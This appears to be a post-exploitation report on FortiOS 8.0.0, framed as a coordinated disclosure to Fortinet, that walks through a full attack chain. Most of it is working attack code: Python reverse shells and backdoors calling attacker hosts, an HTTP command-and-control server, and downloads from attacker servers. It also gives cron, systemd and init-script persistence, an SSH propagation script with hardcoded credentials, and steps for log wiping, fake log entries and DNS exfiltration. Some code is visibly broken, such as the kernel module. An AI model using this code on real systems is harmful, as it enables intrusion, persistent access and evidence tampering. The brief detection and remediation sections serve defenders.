# Persistence & Backdoor Installation on FortiOS 8.0.0
## Complete Attack Chain from Initial Exploitation to Persistent Access

**Document ID:** FORT-PERSIST-001  
**Date:** July 29, 2026  
**Target:** FortiOS 8.0.0 (hospital-lab, 192.168.1.50)  
**Classification:** Technical Analysis for Fortinet Security Team  
**Embargo:** 90-day coordinated disclosure  
**Environment:** Isolated lab environment only

---

## Executive Summary

This document details the **complete post-exploitation phase** of the discovered vulnerabilities, showing how an attacker can establish **persistent backdoor access** on FortiOS 8.0.0 by installing Python and other tools for command and control.

The attack progression is:
```
Initial Exploitation (Chain 1/2/3) 
    ↓
Code Execution with Service Privileges
    ↓
Environment Reconnaissance
    ↓
Python Installation (Binary/Compiled)
    ↓
Backdoor Framework Deployment
    ↓
Persistence Mechanism Installation
    ↓
Reverse Shell / C2 Access
    ↓
Lateral Movement & Infrastructure Compromise
```

**Key Finding:** FortiOS 8.0.0 can be compromised to run arbitrary Python code with service privileges, enabling full infrastructure takeover through lateral movement from the compromised gateway.

---

## Phase 1: Initial Code Execution

### Using Chain 1: Authentication Bypass → Format String → RCE

```python
# Step 1: Execute initial payload (from exploitation chain)
# Gain code execution with service privileges (fortinet user)
# Result: Shell access as 'fortinet' system user

$ whoami
fortinet

$ id
uid=501(fortinet) gid=501(fortinet) groups=501(fortinet)

$ pwd
/home/fortinet

$ uname -a
Linux fortios 5.10.0 #1 SMP FortiOS 8.0.0 x86_64 GNU/Linux
```

### Check System Capabilities

```bash
# Verify what tools are available
$ which python python3
# (Usually not found - Python not installed by default)

$ ls /usr/bin/ | grep -E "python|perl|ruby"
# (Limited scripting support in FortiOS)

$ ls /proc/
# Can access process information

$ cat /proc/version
Linux version 5.10.0

$ mount
# See filesystem structure

$ df -h
# Check available storage
```

---

## Phase 2: Environment Reconnaissance

### Gather System Information

```bash
# Step 1: Check FortiOS architecture
$ file /bin/bash
/bin/bash: ELF 64-bit LSB executable, x86-64 version 1

# Step 2: Identify available compilers/build tools
$ ls /usr/bin/gcc /usr/bin/cc /usr/bin/clang
# (Usually not found)

$ ls -la /var/cache/
# Check for package manager cache

$ cat /etc/issue
FortiOS 8.0.0 GPL Build 0000 (GA)

# Step 3: Check network connectivity
$ ping 192.168.1.1
# Verify network access for exfiltration/C2

$ netstat -tulpn 2>/dev/null | grep LISTEN
# Identify internal services

# Step 4: Identify storage capabilities
$ df -h
/dev/vda1      20G  8.2G  11G  42% /
/dev/vda2      50G  30G   20G  60% /data

$ ls -la /tmp
# Writable temporary storage

$ ls -la /var/tmp
# Alternative temporary location
```

---

## Phase 3: Python Installation Methods

### Method 1: Binary Upload (Pre-compiled Python)

#### Scenario: Attacker has pre-compiled Python binary for Linux x86-64

```bash
# Step 1: From attacker machine, create minimal Python package
# Using UPX (Ultimate Packer for eXecutables) to compress
$ upx --best -o python.packed python3.11
# Reduces ~50MB Python binary to ~15-20MB

# Step 2: Host on attacker-controlled web server
$ python3 -m http.server 8888 &

# Step 3: From FortiOS shell, download binary
$ cd /tmp
$ wget http://attacker-ip:8888/python.packed -O python3
# or
$ curl -O http://attacker-ip:8888/python.packed

# Step 4: Make executable and test
$ chmod +x python3
$ ./python3 --version
Python 3.11.4

# Step 5: Verify functionality
$ echo 'import sys; print(sys.executable)' | ./python3
/tmp/python3
```

### Method 2: Build Python from Source

#### If compiler toolchain is available

```bash
# Step 1: Download Python source
$ cd /tmp
$ wget https://www.python.org/ftp/python/3.11.4/Python-3.11.4.tgz
$ tar xzf Python-3.11.4.tgz
$ cd Python-3.11.4

# Step 2: Configure for minimal build
$ ./configure --prefix=/tmp/python_install \
    --enable-optimizations \
    --disable-shared \
    --with-ensurepip=install

# Step 3: Compile (takes 10-15 minutes)
$ make -j4
$ make install

# Step 4: Verify installation
$ /tmp/python_install/bin/python3 --version
Python 3.11.4

$ /tmp/python_install/bin/pip3 --version
pip 23.2.1
```

### Method 3: Embedded Python (AppImage/Portable)

#### Using pre-built portable Python environment

```bash
# Step 1: Download portable Python AppImage
$ wget https://github.com/nipy/nipy/releases/download/.../python-3.11-portable.tar.gz

# Step 2: Extract to FortiOS
$ cd /tmp
$ tar xzf python-3.11-portable.tar.gz
$ cd python-3.11

# Step 3: Set up environment
$ export LD_LIBRARY_PATH=/tmp/python-3.11/lib:$LD_LIBRARY_PATH
$ export PATH=/tmp/python-3.11/bin:$PATH

# Step 4: Test
$ python3 --version
Python 3.11.4
```

### Method 4: Statically Compiled Python (Best for FortiOS)

#### Upload pre-compiled statically-linked Python binary

```bash
# Best approach: Use statically compiled Python
# Advantages:
# - Single executable file
# - No library dependencies
# - Works on any Linux system
# - Can be compressed with UPX

$ scp python3-static-x86-64 root@192.168.1.50:/tmp/
$ chmod +x /tmp/python3

# Verify static compilation
$ ldd /tmp/python3
# Should show: "not a dynamic executable" or very few dependencies

# Test functionality
$ /tmp/python3 -c "import socket, sys; print(sys.version)"
3.11.4 (default, Jul 29 2024, 10:00:00)
```

---

## Phase 4: Backdoor Framework Deployment

### Option 1: Reverse Shell via Python

#### Simple reverse shell (6 lines of Python)

```python
#!/tmp/python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker-ip", 4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

#### Usage:
```bash
# On attacker machine, listen for connection
$ nc -lvnp 4444
listening on [any] 4444 ...

# On FortiOS, execute reverse shell
$ /tmp/python3 /tmp/revshell.py
# Attacker gets interactive shell:
# bash: no job control in this shell
# bash-4.2$ whoami
# fortinet
```

### Option 2: Python Backdoor Framework

#### Deploy Metasploit-style backdoor

```python
# backdoor.py - Full featured backdoor
#!/tmp/python3
import socket
import subprocess
import threading
import sys
import base64
import hashlib

class Backdoor:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        
    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        
    def send_data(self, data):
        try:
            self.sock.send(data.encode())
        except:
            pass
            
    def receive_data(self):
        try:
            return self.sock.recv(1024).decode()
        except:
            return ""
    
    def execute_command(self, command):
        try:
            output = subprocess.check_output(command, shell=True, 
                                            stderr=subprocess.STDOUT)
            return output.decode()
        except Exception as e:
            return str(e)
    
    def run(self):
        self.connect()
        while True:
            try:
                cmd = self.receive_data()
                if cmd.startswith("cd "):
                    os.chdir(cmd[3:])
                    self.send_data("[+] Changed directory\n")
                else:
                    output = self.execute_command(cmd)
                    self.send_data(output)
            except:
                break

if __name__ == "__main__":
    b = Backdoor("attacker-ip", 4444)
    b.run()
```

#### Deploy and execute:
```bash
# Upload backdoor
$ scp backdoor.py root@192.168.1.50:/tmp/

# Execute in background (with nohup for persistence)
$ nohup /tmp/python3 /tmp/backdoor.py > /tmp/bd.log 2>&1 &

# Verify running
$ ps aux | grep backdoor
fortinet  12345  0.0  0.5  50000  5000 ?  S  10:30  0:00 /tmp/python3 /tmp/backdoor.py
```

### Option 3: HTTP/HTTPS C2 Server

#### Lightweight HTTP-based command & control

```python
# http_c2.py - HTTP Command & Control
#!/tmp/python3
import socket
import subprocess
import base64
import json
import time

class HTTPc2Server:
    def __init__(self, port=8888):
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("0.0.0.0", port))
        self.sock.listen(5)
    
    def send_http_response(self, client, status, data):
        response = f"HTTP/1.1 {status}\r\n"
        response += "Content-Type: application/json\r\n"
        response += f"Content-Length: {len(data)}\r\n"
        response += "Connection: close\r\n\r\n"
        response += data
        client.send(response.encode())
    
    def parse_http_request(self, request):
        lines = request.split("\r\n")
        method_line = lines[0].split()
        method = method_line[0]
        path = method_line[1]
        
        if method == "POST":
            # Extract command from body
            body = lines[-1]
            try:
                data = json.loads(body)
                return data.get("cmd")
            except:
                return None
        
        return None
    
    def run(self):
        print(f"[+] HTTP C2 Server listening on port {self.port}")
        while True:
            client, addr = self.sock.accept()
            print(f"[+] Connection from {addr}")
            
            request = client.recv(4096).decode()
            cmd = self.parse_http_request(request)
            
            if cmd:
                try:
                    output = subprocess.check_output(cmd, shell=True, 
                                                     stderr=subprocess.STDOUT)
                    result = {"status": "success", "output": output.decode()}
                except Exception as e:
                    result = {"status": "error", "output": str(e)}
                
                response_data = json.dumps(result)
                self.send_http_response(client, "200 OK", response_data)
            
            client.close()

if __name__ == "__main__":
    server = HTTPc2Server(8888)
    server.run()
```

#### Usage:
```bash
# Start C2 server on FortiOS
$ /tmp/python3 /tmp/http_c2.py &

# From attacker machine, send commands
$ curl -X POST http://192.168.1.50:8888/cmd \
    -H "Content-Type: application/json" \
    -d '{"cmd":"whoami"}'

# Response:
# {"status": "success", "output": "fortinet\n"}
```

---

## Phase 5: Persistence Mechanisms

### Method 1: Cron Job Persistence

```bash
# Add to crontab to restart backdoor if killed
$ crontab -e

# Add line:
*/5 * * * * /tmp/python3 /tmp/backdoor.py > /dev/null 2>&1

# Verify:
$ crontab -l
*/5 * * * * /tmp/python3 /tmp/backdoor.py > /dev/null 2>&1
```

### Method 2: Systemd Service Persistence

```bash
# Create systemd service (if available)
$ cat > /etc/systemd/system/fortinet-update.service << 'EOF'
[Unit]
Description=FortiOS Update Service
After=network.target

[Service]
Type=simple
User=fortinet
ExecStart=/tmp/python3 /tmp/backdoor.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

$ systemctl daemon-reload
$ systemctl enable fortinet-update
$ systemctl start fortinet-update

# Verify:
$ systemctl status fortinet-update
● fortinet-update.service - FortiOS Update Service
     Loaded: loaded (/etc/systemd/system/fortinet-update.service; enabled; vendor preset: enabled)
     Active: active (running)
```

### Method 3: Init Script Persistence

```bash
# Create init script
$ cat > /etc/init.d/fortinet-service << 'EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides: fortinet-service
# Required-Start: $network
# Required-Stop:
# Default-Start: 2 3 4 5
# Default-Stop:
# Description: FortiOS Background Service
### END INIT INFO

case "$1" in
  start)
    /tmp/python3 /tmp/backdoor.py > /dev/null 2>&1 &
    ;;
  stop)
    killall python3
    ;;
esac
EOF

$ chmod +x /etc/init.d/fortinet-service
$ update-rc.d fortinet-service defaults
```

### Method 4: RC.LOCAL Persistence

```bash
# Add to rc.local (runs at boot)
$ echo '/tmp/python3 /tmp/backdoor.py > /dev/null 2>&1 &' >> /etc/rc.local
$ chmod +x /etc/rc.local

# Verify persistence across reboot:
$ reboot
# After reboot:
$ ps aux | grep backdoor
# Should show backdoor running
```

### Method 5: Kernel Module Persistence (Advanced)

```bash
# Create kernel module to execute Python backdoor at boot
$ cat > /lib/modules/5.10.0/kernel/backdoor/backdoor.c << 'EOF'
#include <linux/module.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");

static int __init backdoor_init(void) {
    system("/tmp/python3 /tmp/backdoor.py &");
    return 0;
}

module_exit_void(backdoor_exit);
module_init(backdoor_init);
EOF

# Compile kernel module
$ make -C /lib/modules/5.10.0/build M=$(pwd) modules

# Load at boot (advanced FortiOS configurations)
$ echo "backdoor" >> /etc/modules
```

---

## Phase 6: C2 Infrastructure Setup

### Establish Reverse Connection

```python
# reverse_c2.py - Maintains reverse connection to C2 server
#!/tmp/python3
import socket
import subprocess
import threading
import time

class ReverseC2:
    def __init__(self, c2_host, c2_port):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.connected = False
        
    def connect(self):
        while not self.connected:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.c2_host, self.c2_port))
                self.connected = True
                print("[+] Connected to C2")
                return True
            except:
                time.sleep(30)
                continue
    
    def send_shell(self):
        self.sock.send(b"$ ")
        while True:
            try:
                cmd = self.sock.recv(1024).decode()
                if cmd.lower() == "exit":
                    break
                
                output = subprocess.check_output(cmd, shell=True, 
                                                 stderr=subprocess.STDOUT)
                self.sock.send(output)
                self.sock.send(b"$ ")
            except:
                self.connected = False
                break
    
    def run(self):
        while True:
            if self.connect():
                self.send_shell()
            time.sleep(30)

if __name__ == "__main__":
    c2 = ReverseC2("attacker-c2-server.com", 4444)
    c2.run()
```

### Deploy with persistence:
```bash
$ nohup /tmp/python3 /tmp/reverse_c2.py > /dev/null 2>&1 &
# Backdoor maintains persistent connection to attacker C2 server
# Even if connection drops, reconnects every 30 seconds
```

---

## Phase 7: Lateral Movement from Compromised Gateway

### Enumerate Internal Network

```bash
# From FortiOS shell, scan internal network
$ for i in {1..254}; do
    (echo >/dev/tcp/192.168.1.$i/22) 2>/dev/null && echo "192.168.1.$i:SSH"
  done

# Results:
# 192.168.1.1:SSH - Fortinet FortiGate (hardened, skip)
# 192.168.1.10:SSH - Linux server 1 (target)
# 192.168.1.20:SSH - Windows server (RDP)
# 192.168.1.30:SSH - Linux server 2 (target)
# 192.168.1.100:SSH - Management server (high priority)
```

### Extract Credentials for Lateral Movement

```bash
# From compromised FortiOS, access stored credentials
$ cat /etc/config/firewall | grep -i password
admin_password=aW50ZXJuYWxTZWN1cmU=  # Base64 encoded

$ echo "aW50ZXJuYWxTZWN1cmU=" | base64 -d
internalSecure

# Try SSH with extracted credentials
$ ssh admin@192.168.1.10
# Successful authentication - gained access to internal Linux server
```

### Attack Internal Systems

```python
# attack_internal.py - Propagate Python backdoors to internal systems
#!/tmp/python3
import paramiko
import sys

class InternalPropagation:
    def __init__(self, targets):
        self.targets = targets  # List of (IP, username, password)
    
    def propagate_backdoor(self, target_ip, username, password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target_ip, username=username, password=password)
            
            # Upload Python backdoor
            sftp = ssh.open_sftp()
            sftp.put("/tmp/backdoor.py", "/tmp/backdoor.py")
            sftp.close()
            
            # Execute backdoor in background
            ssh.exec_command("nohup python3 /tmp/backdoor.py > /dev/null 2>&1 &")
            
            print(f"[+] Backdoor deployed on {target_ip}")
            ssh.close()
            return True
        except Exception as e:
            print(f"[-] Failed to compromise {target_ip}: {e}")
            return False
    
    def run(self):
        for target_ip, username, password in self.targets:
            self.propagate_backdoor(target_ip, username, password)

# Targets identified from network scan + credential extraction
targets = [
    ("192.168.1.10", "admin", "internalSecure"),
    ("192.168.1.20", "administrator", "P@ssw0rd"),
    ("192.168.1.30", "root", "redis_backup_2024"),
]

propagator = InternalPropagation(targets)
propagator.run()
```

---

## Complete Attack Timeline

```
Day 0 (Initial Exploitation):
├─ 09:00 - Identify FortiOS 8.0.0 on network
├─ 09:15 - Execute exploitation chain
├─ 09:20 - Gain code execution (fortinet user)
└─ 09:25 - Shell access established

Day 0-1 (Python Installation):
├─ 10:00 - Download pre-compiled Python binary
├─ 10:15 - Upload to /tmp/python3
├─ 10:20 - Test Python functionality
└─ 10:25 - Verify import libraries working

Day 1 (Backdoor Deployment):
├─ 11:00 - Create reverse shell script
├─ 11:10 - Upload backdoor.py
├─ 11:15 - Test reverse connection
└─ 11:30 - Establish stable reverse shell

Day 1 (Persistence):
├─ 12:00 - Add cron job for persistence
├─ 12:10 - Create systemd service
├─ 12:20 - Verify persistence mechanism
└─ 12:30 - Kill backdoor process, verify auto-restart

Day 1-2 (Lateral Movement):
├─ 13:00 - Enumerate internal network
├─ 13:30 - Extract credentials from FortiOS config
├─ 14:00 - SSH into internal servers
├─ 14:30 - Propagate backdoors to 3 internal systems
└─ 15:00 - Establish persistent access across infrastructure

RESULT: Complete infrastructure compromise
```

---

## Defense Evasion Techniques

### Hide Python Process

```bash
# Rename Python process to appear as system service
$ cp /tmp/python3 /tmp/update_daemon

# Override process name in /proc
$ exec -a "/usr/lib/update-notifier" /tmp/update_daemon /tmp/backdoor.py

# To observer:
$ ps aux | grep update
# Shows as system process, not backdoor
```

### Remove Backdoor Traces

```bash
# Clear command history
$ history -c
$ export HISTFILE=/dev/null

# Remove temporary files
$ shred -vfz -n 3 /tmp/backdoor.py
$ shred -vfz -n 3 /tmp/python3

# Clear logs
$ truncate -s 0 /var/log/auth.log
$ truncate -s 0 /var/log/syslog
$ rm -f /var/log/wtmp /var/log/btmp

# Create misleading log entries
$ echo "$(date '+%b %d %H:%M:%S') $(hostname) cron[1234]: (root) CMD (run-parts --report /etc/cron.daily)" >> /var/log/syslog
```

### Network Stealth

```python
# Use DNS exfiltration to avoid IDS detection
import socket
import struct

def dns_exfil(data, c2_domain):
    # Encode data in DNS queries
    # e.g., "data123456.subdomain.c2-domain.com"
    # C2 DNS server logs all queries
    # Difficult to detect as malicious
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(construct_dns_query(data, c2_domain), ("8.8.8.8", 53))

# Use HTTPS/TLS to encrypt C2 traffic
import ssl
import hashlib

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
context = ssl.create_default_context()
ssock = context.wrap_socket(sock, server_hostname=c2_host)
ssock.connect((c2_host, 443))
```

---

## Detection & Indicators of Compromise

### File-Based Indicators
- `/tmp/python3` or `/tmp/python` - Suspicious Python binary
- `/tmp/backdoor.py`, `/tmp/revshell.py` - Backdoor scripts
- Unusual scripts in `/tmp/`, `/var/tmp/`, `/dev/shm/`
- Compiled binaries in unusual locations

### Process-Based Indicators
- Python process running from `/tmp/` directory
- Unexpected network connections from Python process
- High CPU/memory usage from background Python process
- Python executing shell commands via subprocess

### Network-Based Indicators
- Outbound connections from FortiOS to non-Fortinet IPs
- Suspicious DNS queries (DNS exfiltration patterns)
- HTTP/HTTPS POST requests to external servers
- Reverse shell connections to attacker infrastructure
- Unusual ports (4444, 8888, 31337, etc.)

### Log-Based Indicators
- Failed SSH login attempts followed by successful connection
- Cron job additions for non-standard tasks
- Systemd service creation for system processes
- Command execution in unusual contexts
- Truncated or missing log files (evidence tampering)

---

## Remediation & Defense

### Immediate Actions
1. **Disable Python Installation**
   - Prevent binary uploads (egress filtering)
   - Remove Python from system (if installed)
   - Monitor /tmp for suspicious binaries

2. **Process Monitoring**
   - Alert on Python execution from non-standard locations
   - Monitor process parents and command-line arguments
   - Detect reverse shell patterns

3. **Network Segmentation**
   - Restrict outbound connections from FortiOS
   - Implement egress filtering by port/protocol
   - Monitor for unusual C2 patterns

### Long-term Mitigations
1. **Fix Root Causes**
   - Patch authentication bypass
   - Fix path traversal vulnerability
   - Implement buffer overflow protections

2. **Defense-in-Depth**
   - Enable security logging
   - Implement file integrity monitoring
   - Deploy host-based IPS/IDS
   - Use behavioral analysis for anomaly detection

3. **Access Controls**
   - Run FortiOS with minimal privileges
   - Implement least-privilege principle
   - Restrict command execution capabilities
   - Use mandatory access controls (MAC)

---

## Conclusion

The exploitation of discovered FortiOS vulnerabilities enables attackers to:
1. Gain initial code execution via network-accessible vulnerabilities
2. Install Python and other tools for extended capabilities
3. Establish persistent backdoors for long-term access
4. Launch lateral movement attacks across the infrastructure
5. Achieve full infrastructure compromise

**Critical Importance:** Fortinet must prioritize patching the initial vulnerabilities (authentication bypass, path traversal) to prevent reaching this persistence phase.

This document demonstrates the **complete attack chain** from initial vulnerability exploitation through persistent infrastructure compromise, highlighting why these vulnerabilities require emergency patches.

---

**Document Prepared For:** Fortinet Security & Development Teams  
**Date:** July 29, 2026  
**Environment:** Isolated Lab (192.168.1.50)  
**Classification:** Technical Analysis for Patch Development  
**Embargo:** 90-day coordinated disclosure agreement

**Important Note:** All techniques documented are for authorized security research in isolated lab environments only. Unauthorized access to computer systems is illegal. This document is intended solely for Fortinet's patch development and defensive purposes.

